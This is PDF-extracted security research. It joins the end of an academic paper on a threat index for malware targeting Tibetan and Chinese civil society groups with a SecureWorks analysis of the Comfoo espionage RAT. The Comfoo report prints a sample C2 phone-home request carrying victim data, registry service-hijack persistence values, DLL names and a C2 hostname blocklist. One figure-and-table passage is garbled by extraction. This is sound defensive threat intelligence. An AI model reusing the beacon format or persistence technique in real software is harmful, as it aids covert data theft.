By ob- serving overlapping C & C servers , or mapping malware to common exploits identiﬁed by anti virus / security com- panies we can cluster attacks that we believe come from the same malware family and potentially the same adver- sary .
4.3.2 Technical Sophistication Multiplier While the previous analysis is useful for understanding the nature of threats , we also score threats numerically to aid in understanding the relative technical sophistication of their approaches .
Each malware sample is assigned one of the following values : 1 Not Protected - The sample contains no code protec- 8 tion such as packing , obfuscation ( e.g .
simple rotation of interesting or identifying strings ) , or anti - reversing tricks .
1.25 Minor Protection - The sample contains a sim- ple method of protection , such as one of the following : code protection using publicly available tools where the reverse method is available , such as UPX packing ; sim- ple anti - reversing techniques such as not using import tables , or a call to IsDebuggerPresent ( ) ; self - disabling in the presence of AV software .
1.5 Multiple Minor Protection Techniques - The sam- ple contains multiple distinct minor code protection tech- niques ( anti - reversing tricks , packing , VM / reversing tools detection ) that require some low - level knowledge .
This level includes malware where code that contains the core functionality of the program is decrypted only in memory .
1.75 Advanced Protection - The sample contains mi- nor code protection techniques along with at least one advanced protection method such as rootkit functionality or a custom virtualized packer .
2 Multiple Advanced Protection Techniques - The sample contains multiple distinct advanced protection techniques , e.g .
rootkit capability , virtualized packer , multiple anti - reversing techniques , and is clearly de- signed by a professional software engineering team .
The purpose of the technical sophistication multiplier is to measure how well the payload of the malware can conceal its presence on a compromised machine .
We use a multiplier because advanced malware requires signif- icantly more time and effort ( or money , in the case of commercial solutions ) to customize for a particular tar- get .
We focus on the level of obfuscation used to hide pro- gram functionality and avoid detection for the follow- ing reasons : ( 1 ) It allows the compromised system to remain infected for a longer period ; ( 2 ) it hinders ana- lysts from dissecting a sample and developing instruc- tions to detect the malware and disinfect a compromised system ; ( 3 ) since most common used remote access tro- jans ( RATs ) have the same core functionality ( e.g .
key- logging , running commands , exﬁltrating data , control- ling microphones and webcams , etc .
) the level of ob- fuscation used to conceal what the malware is doing can be used to distinguish one RAT from another .
4.3.3 Summary of Technical Sophistication Multi- plier Value Figure 4 shows the technical sophistication multiplier values for e - mails submitted by the different organiza- tions in our study .
One key observation we make here is that the email - based targeted malware that was self- Figure 4 : Technical sophistication multiplier assigned to e - mail submissions from groups that submitted at least 50 e - mails .
reported by our study groups is relatively simple .
The highest multiplier value we see is 1.5 and even that value is seen infrequently .
The majority of malware observed is rated either 1 or 1.25 according to our technical scoring criteria , with Tibetan Groups observing a higher fraction of malware rated 1.25 and Chinese groups observing a higher fraction rated 1 .
The technical sophistication multiplier value is also useful for assessing the technical evolution of threats in our study .
When we group malware into different fam- ily groups we can see some of these groups are under active development .
For example , we observe multiple versions of the Enfal , Mongal , and Gh0st RAT families with increasing levels of sophistica- tion and defenses in place to protect the malware code ( resulting in an increase in technical multiplier from 1 to 1.25 for these families ) .
Since our technical multiplier value focuses on how well malware code defends and disguises itself , changes to other aspects of the code may not result in an increase in value ( e.g. , we observe multi- ple versions of the IMuler . A / Revir . A malware which all receive a score of 1 ) .
Interestingly , when we observe both a Windows and Mac version of a given malware family , the technical score for the Mac version tended to be lower with the Mac version being relatively primitive relative to the Windows variant .
4.4 TTI Results We now show how the TTI metric can help us better char- acterize the relative threat posed by targeted malware .
Figure 5 shows the technical sophistication multiplier and maximum / minimum TTI scores for malware fami- lies observed in our dataset .
Since we primarily observe simple malware , with a technical sophistication multi- plier of 1 or 1.25 , this value does a poor job of differen- tiating the threat posed by the different malware families to the CSOs .
However , by incorporating both the tech- nical sophistication and targeting base value into the TTI metric we can gain more insights into how effective these 9 7 TTI / Technical Sophistication Score 6 Table 4 : Top malware families in our data set in terms of 5 4 technical sophistication multiplier and in terms of ﬁnal 3 TTI score .
2 Technical Sophistication 1 0 Family TTI Tech .
Soph .
shadownet duojeen Vidgrab 9002 Ezcob Gh0stRAT CCTV0 Insta11 PlugX UDP Mongal nettraveler netpass RegSubDat Scar.hikn 3102 WMIScriptKids Mirage later variant Enfal Lurid Xtreme Rat Surtr Quarian IMuler Riler Gh0stRAT 3102 3 1.5 nAspyUpdate 1.5 1.5 PlugX 4.5 1.5 PoisonIvy 3 1.5 Malware Family WMIScriptKids 3 1.5 Minimum TTI Maximum TTI Technical Sophistication Multiplier TTI Family TTI Tech .
Soph .
.
Figure 5 : Comparison of the maximum and minimum Gh0stRAT LURK0 6.25 1.25 TTI score and technical sophistication multiplied for shadownet 6.25 1.25 malware families observed in our data ( sorted in decreas- conime 5 1.25 ing order of maximum TTI ) .
duojeen 5 1.25 iexpl0re 5 1.25 threats may be in practice .
The impact of using TTI is especially apparent when trying to gain insights into the targeted malware that poses the biggest risk to CSOs .
Table 4 shows the top 5 malware families we observe in terms of technical so- phistication and in terms of TTI score .
If we consider the malware families with the highest technical sophistica- tion , we can see that their TTI values are relatively low , with maximums ranging from 1.5 to 4.5 .
These tend to be malware families that are familiar to researchers .
In par- ticular , PlugX and PoisonIvy have been used in targeted attacks together and PlugX is still actively used and under constant development .
Despite technical so- phistication , the social engineering lures of these threats are not well crafted and pose less of a risk to the CSOs whose members may be able to identify and avoid these threats .
In contrast , the top 5 malware families in terms of TTI have lower technical sophistication ( 1.25 ) but much higher levels of social engineering .
It is no surprise that threats which score the highest TTI use well known mal- ware that have been extensively documented in attacks against a variety of targets .
For example , the TTI scores reﬂect that Gh0st RAT continues to be seen in higher risk attacks due to its popularity amongst attackers even though it is an older and not particularly advanced tool .
Since there is no direct connection between the technical sophistication of threats and the level of social engineer- ing used to target CSOs , it is likely that different threat actors , with a different focus , are at work here .
Indeed , Gh0st RAT was discovered by the Citizen Lab in their analysis of GhostNet and IEXPL0RE RAT was dis- covered and named for the ﬁrst time in our work .
Another observation is that commercial malware such as FinFisher and DaVinci RCS , while being of much higher technical sophistication ( relative to the samples in our study ) , do not necessarily score higher on TTI than a targeted attack with advanced social engineering and more basic malware .
For example , analyzing a FinFisher sample targeted against Bahraini activists with the TTI , produces an overall TTI score that is dependent on the social targeting aspect , even though the malware is very technically advanced .
In this case , the FinFisher at- tack scores 4.0 on the TTI ( base targeting score of 2 with a technical multiplier of 2 ) .
Although the email used in the attack references the name and organization of a real journalist , the content is poorly customized , and has attributes that look questionable .
However , the techni- cal sophistication of the malware is advanced earning it a score of 2 due to multiple advanced protection tech- niques , including a custom - written virtualized packer , MBR modiﬁcation , and rootkit functionality .
The sample also uses multiple minor forms of protection , including at least half a dozen anti - debugging tricks .
Even though the technical multiplier is the maximum value , the over- all TTI score is only 4.0 due to the low targeting base value .
FinFisher is only effective if it is surreptitiously installed on a users ' computer .
If the malware is deliv- ered through an email attachment , infection is only suc- cessful if the user opens the malicious ﬁle .
The advanced nature of this malware will cause the overall score to in- crease quickly with improved targeting , but as it still re- quires user intervention , this threat scores lower overall than attacks with highly targeted social engineering us- ing less sophisticated malware .
Similar ﬁndings can also be observed in attacks using DaVinci RCS developed by Italy - based company Hack- ing Team against activists and independent media groups from the United Arab Emirates and Morocco .
While the malware used in these publicly reported attacks is 10 technically sophisticated , the social engineering lures employed are poorly customized for the targets result- ing in a 4.0 TTI score ( targeting base value 2 , technical multiplier 2 ) .
These results support the idea that different threat ac- tors have varying focuses and levels of resources , and as a result , different methodologies for attacks .
For ex- ample , the majority of malware submitted by our study groups appear to be from adversaries that have in - house malware development capabilities and the capacity to organize and implement targeted malware campaigns .
These adversaries are spending signiﬁcant effort on so- cial engineering , but generally do not use technically advanced malware .
Conversely , the adversaries using FinFisher and DaVinci RCS have bought these products rather than develop malware themselves .
However , while the FinFisher and RCS samples are technically sophisti- cated pieces of malware , the attacks we analyzed are not sophisticated in terms of social engineering tactics .
4.5 Limitations of TTI While the Targeted Threat Index gives insight into the distribution of how sophisticated threats are , we are still in the process of evaluating and reﬁning it through in- teractions with the groups in our study and inclusion of more sophisticated threats observed in related investiga- tions in our lab .
Average TTI scores in our dataset may be skewed due to the self - reporting method we use in the study .
Very good threats are less likely to be noticed and reported while being sent to far fewer people , and low- quality emails are much more likely to be sent in bulk and stand out .
It is also possible that individuals in differ- ent groups may be more diligent in submitting samples , which could affect between group comparisons .
We are more interested , however , in worst - case ( highest ) scores and not in comparing the average threat severity between organizations .
Finally , this metric is calculated based on the technical sophistication of the payload , not on the speciﬁc exploit .
There is currently no method to modify the TTI score in a way similar to the temporal metrics used by the CVSS metric .
A temporal metric could be added to increase the ﬁnal TTI value for 0-day vulnerabilities , or possibly to reduce the score for exploits that are easily detectable due to a public and well - known generation script , e.g .
Metasploit Our study primarily focuses on threats that groups work- ing on human rights issues related to Tibet or China are currently facing .
While our dataset is concentrated on these types of groups , our results have implications for how CSOs can protect themselves against email - based targeted malware .
Speciﬁcally , we ﬁnd that moving towards cloud - based platforms ( e.g. , Google Docs ) instead of relying on e- mail attachments would prevent more than 95 % of the e - mail malware seen by 2 out of 3 Tibetan groups that had more than 50 e - mail submissions .
Further , our results highlight the potential for lower- cost user education initiatives to guard against sophis- ticated social engineering attacks , rather than high cost technical solutions .
This observation stems from the fact that much of the malware we observe is not technically sophisticated , but rather relies on social engineering to deliver its payload by convincing users to open malicious attachments or links .
Other studies that have revealed the use of commercial malware products against CSOs and journalists have shown that many of these cases also rely on duping users into opening malicious e - mail attachments or social engineered instant messag- ing conversations .
These incidents show that even ad- vanced targeted malware requires successful exploitation of users through social engineering tactics .
User education can be a powerful tool against the kinds of targeted attacks we observed in this study .
In- deed , the Tibetan community has taken an active ap- proach with campaigns that urge Tibetan users to not send or open attachments and suggests alternative cloud based options such as Google Docs and Dropbox for sharing documents .
We have also engaged the Ti- betan groups in a series of workshops to introduce train- ing curriculum which draws on examples submitted by organizations participating in our study .
We have also provided them with technical background to identify sus- picious e - mail headers and how to use free services to check the validity of suspicious links in e - mail messages .
The mitigation strategies presented here are focused on email vectors and do not consider all of the possible attacks these groups may face .
We highlight these strate- gies in particular because the majority of groups in our study identiﬁed document - based targeted malware as a high priority information security concern .
The adver- saries behind these attacks are highly motivated and will likely adapt their tactics as users change their behaviors .
For example , it is plausible that if every user in a partic- ular community began to avoid opening attachments and document - based malware infected fewer targets , attack- ers may move on to vectors such as waterhole attacks or attacks on cloud document platforms to ﬁll the gap .
User education and awareness raising activities need to be on- going efforts that are informed by current research on the state of threats particular communities are experiencing .
Evaluation of the effectiveness of user education efforts in at risk communities and corresponding reactions from attackers is required to understand the dynamics between 11 these processes .
There is a wide body of literature on ﬁltering and detec- tion methods for spam and phishing emails and websites .
Attention has also been given to evaluating user behavior around phishing attacks and techniques for evading them .
By comparison research on detecting email vectors used for targeted malware attacks is limited .
A notable excep- tion is , which uses threat and recipient features with a random forest classiﬁer to detect targeted mali- cious emails in a dataset from a large Fortune 500 com- pany .
Other work has focused on imporoving detection of documents ( e.g .
PDF , Microsoft Ofﬁce ) with embed- ded malicious code Another area of research explores methods for model- ing the stages of targeted attacks and using these mod- els to develop defenses .
Guira and Wang propose a conceptual attack model called the attack pyramid to model targeted attacks and identify features that can be detected at the various stages .
Hutchins , Cloppert and Amin , use a kill chain model to track targeted at- tack campaigns and inform defensive strategies .
Metrics have been developed to characterize security vulnerabilities and their severity .
The indus- try standard is the Common Vulnerability Scoring Sys- tem ( CVSS ) , which uses three metric groups for characterizing vulnerabilities and their impacts .
These groups are : base metric group ( the intrinsic and fun- damental characteristics of a vulnerability that are con- stant over time and user environments ) , temporal metric group ( characteristics of a vulnerability that change over time but not among user environments ) and environmen- tal metric group ( characteristics of a vulnerability that are relevant and unique to a particular user 's environ- ment ) .
The CVSS is a widely adopted metric , but only rates technical vulnerabilities .
Targeted attacks rely on a user action of opening a malicious attachment or visiting a malicious link to successfully compromise a system .
Therefore , the sophistication of message lures and other social engineering tactics are an important part of deter- mining the severity of a targeted attack .
Systems like the CVSS can not address this contextual component .
Our study makes the following contributions to the literature .
Previous studies of targeted attacks against CSOs usually focus on particular incidents or campaigns and do not include longitudinal observations of attacks against a range of CSO targets .
While standards exist for rating the sophistication of technical vulnerabilities and research has been done on detecting targeted mal- ware attacks and modeling campaigns , there is no scor- ing system that considers both the sophistication of mal- ware and social engineering tactics used in targeted mal- ware attacks .
We address this gap through development of the TTI and validate the metric against four years of data collected from 10 CSOs .
Our study provides an in - depth look at targeted malware threats faced by CSOs .
We ﬁnd that considering the technical sophistication of these threats alone is insuf- ﬁcient and that educating users about social engineer- ing tactics used by adversaries can be a powerful tool for improving the security of these organizations .
Our results point to simple steps groups can take to protect themselves from document - based targeted malware such as shifting to cloud - based document platforms instead of relying on attachments which can contain exploits .
Further research is needed to measure the effectiveness of education strategies for changing user behaviour and how effective these efforts are in mitigation of document- based malware for CSOs .
Further work is also required in monitoring how attackers adapt tactics in response to observed behavioural changes in targeted communities .
In ongoing work we are continuing our collection of e- mails and NIDS alerts as well as monitoring other attacks against these groups ( e.g. , waterhole attacks and DoS at- tacks ) to understand how threats vary based on their de- livery mechanism .
We are also working to extend our methodology to more diverse CSO communities such as those in Latin America , Africa , and other underreported regions to better document the politically motivated dig- ital threats they may be experiencing .
This work was supported by the John D. and Catherine T. MacArthur Foundation .
We are grateful to Jakub Dalek , Sarah McKune , and Justin Wong for research assistance .
We thank the USENIX Security reviewers and our shep- herd Prof . J. Alex Halderman for helpful comments and guidance .
We are especially grateful to the groups who participated in our study .
References Figure 6 : Example of e - mail with Targeting Score 1 Figure 7 : Example of e - mail with Targeting Score 2 A Examples of targeted e - mails In this section , we provide speciﬁc examples of e - mails that would be assigned targeting scores described in Sec- tion 4.2.2 .
Targeting Score 1 ( Targeted Not customized ) .
The e- mail in Figure 6 was sent to Tibet group 1 .
The message content and sender are vague and do not relate to the in- terest of the group .
The attachment is a word document implanted with malware .
The lack of relevant informa- tion in this message gives it a score of 1 ( targeted , not customized ) .
Targeting Score 2 ( Targeted , Poorly Customized ) .
The e - mail in Figure 7 was sent to Tibet group 1 .
It refer- ences Tibetan self - immolations which is an issue of inter- est to the group .
However , the sender does not appear to be from a real person or organization .
The message con- tent is terse and does not referenced information that can be externally validated .
Therefore this message scores a 2 ( targeted , poorly customized ) .
14 Figure 8 : Example of e - mail with Targeting Score 3 Targeting Score 3 ( Targeted Customized ) .
The e- mail in Figure 8 was sent to Tibet group 2 .
On the sur- face it appears to be a professional e - mail from `` Palden Sangpo '' a consultant at the Tibet Career Centre .
The e - mail sender address and signature reference accurate contact details that can be easily veriﬁed through an In- ternet search .
However , the e - mail headers reveal the purported e - mail sender address is fraudulent and the actual sender was albano_kuqo @ gmx.com .
The e - mail generally addresses the organization rather than the indi- vidual recipient .
Therefore this message scores a 3 ( tar- geted , customized ) .
Targeting Score 4 ( Targeted Personalized ) .
The e- mail in Figure 9 was sent to Tibet group 1 .
It is directly addressed to the director of the group and appears to come from Mr. Cheng Li , a prominent China scholar based at the Brookings Institute .
The e - mail address is made to appear to be from Mr. Cheng Li , but from an AOL account ( chengli.brookings @ aol.com ) that was registered by the attackers .
The message asks the recip- ient for information on recent Tibetan self - immolations .
The level of customization and personalization used in Figure 9 : Example of e - mail with Targeting Score 4 this message gives it a score of 4 ( targeted , personalized ) .
Targeting Score 5 ( Targeted Highly Personalized ) .
Targeting scores of 5 ( targeted , highly personalized ) re- quire reference to internal information to the target orga- nization that could not be obtained through open sources .
Examples of messages scoring at this level include an e - mail that purported to come from a funder of China Group 3 that provided details of an upcoming meeting the group actually had scheduled with the funder .
In another example , Tibet Group 2 and Tibet Group 3 re- ceived separate e - mails that contained speciﬁc personal details about a South African group 's visit to Dharam- sala , India that appear to have been repurposed from a real private communication .
The malicious attachment contained an authentic travel itinerary , which would be displayed after the user opened the document .
The pri- vate information used in these messages suggest that the attackers performed signiﬁcant reconnaissance of these groups and likely obtained the information through prior compromise .
Author : Joe Stewart and Don Jackson , Dell SecureWorks Counter Threat Unit ( TM ) Threat Intelligence Date : 31 July 2013 URL : http : //www.secureworks.com / cyber - threat - intelligence / threats / secrets - of- the - comfoo - masters/ The details of organized cyber - espionage campaigns are becoming more public .
So- called `` Advanced Persistent Threat '' ( APT ) attacks are common news as individuals and corporations discover the data on their hard drives is part of a country or competitor 's '' shopping list .
'' The actors behind these attacks are generally well - equipped in terms of training , finances , and access to resources .
The missions of APT threat actors are usually of strategic importance , and the actors exercise virtually unlimited patience in penetrat- ing and persisting inside their specific target 's network until they accomplish their goals .
One of the universal aspects of APT attacks is the use of malicious software tools that grant unauthorized backdoor access to computer systems inside the targeted network .
Because maintaining a beachhead inside the network is often critical to mission success , threat actors must adapt to various network configurations and changes in defenses by choosing and deploying backdoors with specific functionality and features .
It is difficult to be persistent without at least one backdoor .
Threat actors often possess and use an ar- senal of remote access trojans ( RATs ) to siphon data from their targets .
Persistence re- quires malware , and the top cyber - espionage actors have hundreds of RATs at their dis- posal at any given time .
Understanding the choice and usage of tools can be the keys to identifying and tracking APTs .
Dell SecureWorks researchers have identified and classified more than 200 distinct mal- ware families used by various APT groups .
Some malware is specially configured off- the - shelf software , and some malware is customized source code of an existing RAT .
However , most malware families are proprietary , developed by the APT groups as weapons to be deployed against a variety of targets .
Accurate identification and classifi- cation of this malware by antivirus ( AV ) companies is sparse .
Shared code , the use of common tools , co - infections , and a history of generic or incorrect classification by multi- ple names make the automated tracking of these tools by AV companies difficult .
This inaccuracy can be detrimental when designing defenses based on specific threat indica- tors .
Tracking APTs requires a dedicated malware intelligence effort .
One way applied malware intelligence is used to discover new APT trojans is a recursive investigative method : Malware - > Infrastructure Touchpoints - > New Malware - > and so on .
Cyber - espionage actors often cycle through different RATs over a period of years .
The Dell SecureWorks Counter Threat Unit™ ( CTU ) research team has tracked a RAT known as `` Comfoo '' that has been in continuous development since at least 2006 .
This RAT has maintained a fairly low profile , even though it was used as part of the RSA breach in 2010 , when its code was first analyzed .
Antivirus firm Trend Micro briefly mentioned its use in a 2012 paper titled `` Luckycat Redux - Inside an APT Campaign with Multiple Targets in India and Japan .
'' However , the disclosure of this trojan and some of its command and control ( C2 ) infrastructure did not discourage its continued use by the threat actors responsible for it .
To maintain persistence on the system , Comfoo usually replaces the path to the DLL of an existing unused service rather than installing a new service .
A new service is more likely to be noticed by system audits .
Sometimes Comfoo is delivered with a rootkit that hides Comfoo 's files on disk .
Additionally , Comfoo starts the existing `` ipnat '' system ser- vice .
This action causes remote inbound connections to the infected system to fail , block- ing remote maintenance by the network administrator .
Comfoo 's network traffic is encrypted and encapsulated in HTTP requests and respons- es , although some variants skip the encapsulation step .
Payloads are encrypted by a 10- byte static XOR key that is hard - coded inside the Comfoo binary .
Initial login data from the infected system ( MAC address , internal IP address , campaign tag , and version data ) is passed in the request URI and is additionally encrypted by a dynamic key , as shown in Figure 1 .
Figure 1 .
Comfoo URL decryption algorithm example .
( Source : Dell SecureWorks ) Capabilities The Comfoo RAT has the following features : System / network information gathering Keystroke logging Screenshots File upload / download / execute Command shell By studying the network traffic of infected systems , CTU researchers determined that the server side of the Comfoo malware sends an HTTP server header identifying the server version as `` Apache 2.0.50 ( Unix ) '' .
However , the rest of the HTTP headers do not match the order or the formatting used by this version of Apache .
This anomaly sug- gests that the C2 software was a standalone application instead of a series of scripts run- ning under Apache .
Searching for the specific server version string in the CTU malware repository produced a sample of the Comfoo server software , identified by the MD5 hash 2b29f0224b632fdd00d0a30527b795b7 .
Analysis The Comfoo C2 server turns out to be a rendezvous - type traffic relay program .
This small binary can be deployed on rented or hacked Windows systems , where it passes traffic between Comfoo victims and the Comfoo master console operated by the threat actors ( see Figure 2 ) .
Figure 2 .
Organization of rendezvous - type traffic relay program .
( Source : Dell SecureWorks ) Unlike `` dumb '' traffic relay servers such as HTran , the Comfoo relay server does not know the location of the master console .
Instead , the master console program connects to the relay server on - demand , and any incoming victim data is passed to the master console connection .
HTran is sometimes used to add an additional layer of untraceabili- ty to the victim connection .
Likewise , the administrator can add other layers of proxies or VPN connections to the console connection side of the communication .
The Comfoo relay server listens on up to three TCP ports at a time .
The first port acts as a control and typically listens on port 1688 .
It performs the following tasks : Enables / disables the other ports Accepts new relay port configuration ( stored in rlycfg.dll ) Notifies master console that a new victim connection is available The second port is the admin relay port , which typically listens on port 1689 .
It accepts connections from the master console to send commands to and receive data from vic- tims ' systems .
The third port is the victim relay port , which listens on a configurable port number , usually port 80 or port 443 .
This port accepts connections from victims ' systems to send data to and receive commands from the Comfoo administrator encapsu- lated in HTTP requests and responses .
If there is no current connection between the vic- tim and the Comfoo administrator , Comfoo logs the victim 's connection and sends an idle response to the victim .
DNS resolution tactics In addition to using rendezvous protocols and HTran forwarding servers , Comfoo oper- ators create and maintain another layer of obfuscation to thwart analysis of their infra- structure .
Like many other APT malware families , Comfoo reaches out to its masters based on DNS lookups of certain hostnames .
The Comfoo operators commonly use dy- namic DNS providers to micromanage the IP addresses to which Comfoo hostnames re- solve .
While Comfoo sleeps , its operators often set those IP addresses to common or bo- gus entries .
When not being used to actively control Comfoo , the C2 domain name might resolve to the address of a popular search engine or a local loopback ( 127.0.0.1 ) , private ( 10.1.1.1 ) , or other special use ( 0.0.0.0 ) IP address .
Domain names used in Com- foo operations only point to actual control infrastructure during very short time win- dows .
Only during these time windows do alerts from a DNS monitoring tool inform researchers when it might be possible to locate an actual Comfoo server .
Figure 3 maps IP addresses used in Comfoo campaigns .
Figure 3 .
Geolocation plot of all public routable IP addresses resolved from a set of Comfoo C2 hostnames , including bogus distractors .
( Source : Dell SecureWorks ) The map in Figure 4 shows only the IP addresses that actually speak Comfoo 's protocol , illustrating how DNS tactics such as the distractor IP addresses can mask actual control infrastructure .
Figure 4 .
Geolocation plot of actual IP addresses used for Comfoo C2 servers .
( Source : Dell Se- cureWorks ) Taking control The unauthenticated nature of the Comfoo relay server 's administrative connections makes it possible to take control of the C2 server and all victims ' systems , armed only with knowledge of the protocol , the encryption method , and the static encryption key hard - coded into every Comfoo binary .
Researchers can passively monitor victims ' lo- gins to the relay servers ( sending no commands ) by connecting to the correct port on the correct IP address at the right time .
This technique is analogous to viewing webserver log data stored in a publicly accessible directory on a C2 server .
To help identify and notify victims of Comfoo - based espionage , CTU researchers set up a passive monitoring system for dozens of active Comfoo C2 relays and have been run- ning this system since January 2012 .
Connections from the monitoring system are peri- odic , so not all victim logins are observed .
Only the initial connection data is logged , and it is not possible to see data being exfiltrated from victims ' networks using this method .
Passive monitoring results While monitoring Comfoo , CTU researchers detected more than 200 variants of the tro- jan and 64 different campaign tags used by the threat actors to organize their cam- paigns .
Numerous government entities and private companies based in the United States , Europe , and Asia Pacific had Comfoo - infected computers phoning home to the Comfoo C2 infrastructure ( see Figure 5 ) .
Figure 5 .
Geographic location of Comfoo victim organizations .
( Source : Dell SecureWorks ) Much of the traffic emanated from multiple Japanese and Indian government ministries .
CTU researchers outlined the Japanese attack campaign in a previous analysis entitled Chasing APT .
The following industries were also targeted : Education Energy Mineral exploration News media Semiconductors Steel manufacturing Think tanks Telecommunications Trade organizations Audio and videoconferencing products The targeting of audio and videoconferencing products is unusual .
CTU researchers speculate that the threat actors might be looking for intellectual property relating to au- dio and videoconferencing .
Another possibility is that it could be a clever and stealthy way of listening and watching activities of both commercial and government organiza- tions .
The presence of Comfoo on a network or computer can be detected in a variety of ways , even if AV engines lack detection for the latest variants .
Analysts can search for known Comfoo threat indicators in network traffic , on hard drives , in memory , or in the Win- dows registry .
Network detection A typical Comfoo HTTP phone - home request looks like the following : GET /CWoNaJLBo / VTNeWw11212/12664/12VTNfNmM1aQ / UTWOqVQ132/ HTTP/1.1Accept : image / gif , image / x - xbitmap , image / jpeg , image / pjpeg , * /*Accept - Language : en - enUser - Agent : Mozilla/4.0 ( compatible ; MSIE 6.0 ; Windows NT 5.1 ) Host : smtp.dynami‐ clink.ddns.usConnection : Keep - AliveCache - Control : no - cache An active C2 server responds with headers similar to the following : HTTP/1.1 200 OKDate : Mon , 29 Jul 2013 19:26:15 GMTServer : Apache/2.0.50 ( Unix ) Content - Length : 10Keep - Alive : timeout=15 , max=90 Disk / memory / registry detection The unique string T1Y943jIhk can be found in the Comfoo binary .
Offline forensic analy- sis may be required to search for this string if a rootkit is in play .
These additional strings can be searched but are not guaranteed to be unique to Com- foo : CPUSpeed : % d. % dGHz CPUNameString : % s CPUVendorIdentifier : % s CPUIdentifier : % s No % d CPU Information : SystemCurrent Time : systemBoot Time : IE BHO Name : % s 11 .
IE BHO Information ! 10 .
IE Version Information ! 9 .
InstallApp Information ! 8 .
NETBIOS Information ! 7 .
Protocol Information ! 6 .
NET Information ! 5 .
Disk Information ! 4 .
Account Information ! 3 .
System Time ! 2 .
CPU Type ! Can not get this information , error code is % d .
Windows Version Information ! Additionally , Comfoo uses the SetEvent Windows API and registers an event that fre- quently contains the word `` GAME '' .
The following are example Comfoo event names : exclusiveinstance12 THIS324NEWGAME MYGAMEHAVESTART MYGAMEHAVEstarted MYGAMEHAVESTARTEd MYGAMEHAVESTARTED thisisanewfirstrun THISISASUPERNEWGAMENOWBEGIN thisisnewtrofor024 To persist without adding new registry entries , Comfoo edits an unused system service configuration , replacing the DLL path and setting it to auto - start on boot .
For example , a system service registry key entry changed by Comfoo might resemble the following : system\CurrentControlSet\Services\Netman\Parameters Original : `` ServiceDll '' = > `` % SystemRoot % \System32\netman.dll '' Modified : `` ServiceDll '' = > `` C : \WINDOWS\system32\tabcteng.dll '' system\CurrentControlSet\Services\Netman Original : `` Start '' = > `` 3 '' Modified : `` Start '' = > `` 2 '' Comfoo hijacks service settings for some legitimate service DLLs : netman.dll rasauto.dll sens.dll The following are DLL names commonly used by Comfoo : cmmos.dll jacpet.dll javadb.dll mszlobm.dll netfram.dll netman.dll ntdapie.dll ntdelu.dll ntobm.dll odbm.dll senss.dll suddec.dll tabcteng.dll vmmreg32.dll wininete.dll If Comfoo successfully connects to the relay server and receives commands from the master console , then it creates a file named `` mstemp.temp '' on the infected system to store the output of the last shell command .
Comfoo is the tip of an iceberg .
The CTU research team notified many Comfoo victims , either directly or through the computer security incident response teams ( CSIRTs ) in their respective country .
Analysis was also shared with law enforcement .
Based on the number of campaign tags observed in malware samples versus those seen in live moni- toring by the CTU research team , there are likely hundreds more unidentified victims .
Most businesses will never see a Comfoo infection .
However , evaluating whether an or- ganization is a potential target of cyber - espionage is important in any risk evaluation .
Chief information security officers should maintain awareness of any reported cyber- espionage threats in their business sector .
If one player in an industry is targeted , it is likely all major players ( or newcomers with interesting technology ) in that industry will be targets at some point .
Organizations compromised by Comfoo ( or most types of APT malware ) likely face a major forensic and eradication effort .
This effort should be followed by a major invest- ment in security measures to keep cyber - espionage actors out of the network .
Many in- house security teams do not have the APT expertise to respond to a persistent threat that requires a persistent , active , and layered defense model spanning the entire attack surface of an organization .
As a result , the organization might need outside expertise to effectively mitigate these types of threats .
Appendix : Comfoo hostnames for blacklisting consideration accounts .
ddns .
info my .
amazingrm .
com active .
googleupdate .
hk my .
officebeautyclub .
com active .
nifty - user .
com myweb .
wwwcrazy .
com addr .
googleupdate .
hk nevruz .
mrface .
com ahn06 .
myfw .
us news .
mcesign .
com allroot80 .
4pu .
com news .
rumorse .
com apf .
googleupdate .
hk news .
win .
dnset .
com aptlkxqm .
25u .
com news .
wintersunshine .
net back .
agfire .
com night .
mefound .
com back .
winsupdate .
com nikimen .
etowns .
net bbs .
dynssl .
com nslsa .
microupdata .
com bbs .
gladallinone .
com nsser .
systemsupdata .
com bigdog .
winself .
com nsservic .
googleupdate .
hk billgates .
itsaol .
com nunok .
ninth .
biz bjllgvtms .
effers .
com oct .
clawsnare .
com blizzcon .
sexidude .
com offer .
eosboxster .
com blizzcon .
sexxxy .
biz okkou .
9966 .
org buffet80 .
bigmoney .
biz park006 .
myfw .
us buffet80 .
itsaol .
com pazar .
vicp .
net buffet .
bbsindex .
com pcnews .
rr .
nu bxpudqx .
otzo .
com pcpc .
helpngr .
net cart .
itsaol .
com pcuser .
ikwb .
com catawarm .
gicp .
net podding .
newsinsky .
com cell .
missingthegirl .
com poft .
yahoo - user .
com cmart .
iownyour .
org pofuyer .
4pu .
com config .
microupdata .
com polly .
jwt .
ourhobby .
com copyright .
imwork .
net polly .
slyip .
com cpt .
csinfos .
net poly .
jwt .
ourhobby .
com crsky .
systemsupdata .
com pop3 .
freemail .
mrface .
com database .
googleupdate .
hk pop .
microupdata .
com davidcat .
yick .
lflink .
com pop .
peroillion .
com daviddog .
gicp .
net prc .
deminich .
jungleheart .
com db .
themmdance .
com prc .
dynamiclink .
ddns .
us ddns .
yourturbe .
org pure .
mypop3 .
org deminich .
gicp .
net record .
yick .
lflink .
com deminich .
jungleheart .
com rember .
clawsnare .
com demi .
yick .
lflink .
com reserve .
trickip .
net dgoil .
3322 .
org rouji .
king .
proxydns .
com dns .
google - login .
com s0 ft .
noorno .
com do .
centr - info .
com sapudy .
dns2 .
us dolaamen .
xicp .
net server .
epac .
to domain .
centr - info .
com server .
nifty - login .
com domain .
nifty - user .
com server .
universityexp .
com download .
yourturbe .
org services .
google - config .
com dunya .
8800 .
org shift .
8866 .
org et .
stoneqwer .
com sinagame .
2288 .
org eudge .
3322 .
org singes .
organiccrap .
com eudge .
redirect .
hm singngh .
gicp .
net european .
pass .
as slll .
pbfsnet .
com eurowizard .
byinter .
net smell .
gotgeek .
com facebook .
nifty - japan .
com smtp .
deminich .
jungleheart .
com fact .
winsupdate .
com smtp .
travelexpolorer .
com fbook .
google - login .
com soft .
yahoo - user .
com fish .
windwarp .
uicp .
net sollysly .
servegame .
com football .
deminich .
jungleheart .
com sonam .
goodnews007 .
com football .
dynamiclink .
ddns .
us sports .
wintersunshine .
net foxpart .
oicp .
net srv911 .
yahoo - user .
com free3w .
lflinkup .
org srv91 .
googleupdate .
hk fr .
washbart .
com srv91 .
yahoo - user .
com ftp .
alvinton .
jetos .
com sscdtt .
phmail .
us ftp .
lucky .
ddns .
ms stone .
king .
proxydns .
com ftpserver .
3-a .
net superaround .
ns02 .
biz ftp .
superaround .
ns02 .
biz tech .
bommow .
com ftp .
y3 .
3-a .
net terrys .
rr .
nu funew .
noorno .
